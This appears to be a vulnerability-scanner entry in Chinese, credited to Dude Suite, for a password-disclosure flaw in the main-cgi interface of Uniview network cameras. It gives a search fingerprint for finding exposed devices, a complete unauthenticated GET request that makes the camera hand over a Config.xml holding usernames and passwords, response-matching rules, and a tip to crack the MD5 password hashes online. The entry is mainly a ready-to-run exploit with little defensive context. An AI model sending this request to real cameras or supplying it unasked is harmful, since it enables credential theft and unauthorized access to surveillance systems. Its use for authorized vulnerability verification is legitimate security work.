﻿# 宇视科技视频监控main-cgi密码泄露漏洞

> 更新时间：2023-12-18

> 漏洞编号：

> 漏洞说明：宇视(Uniview)高清网络摄像机是一种高性能的网络摄像机，它可以通过网络进行视频传输和监控。该摄像机采用先进的视频技术，具有高清晰度、低照度、宽动态等特点，能够提供高质量的视频图像。该系统main-cgi接口处存在信息泄露漏洞，可以获取账号密码。使用浏览器访问会下载一个Config.xml文件,其中UserName是用户名，UserPass是密码。使用MD5在线解密工具

> 漏洞特征：app="uniview-视频监控"

> 验证脚本：HTTP

```
GET /cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1} HTTP/1.1
Connection: close
Accept-Encoding: gzip
```

> 响应代码特征：200

> 响应内容特征：UserName

> 上传文件定位：


> 验证文件来源：Dude Suite Web Security Tools - https://www.dudesuite.cn - 转载请注明出处
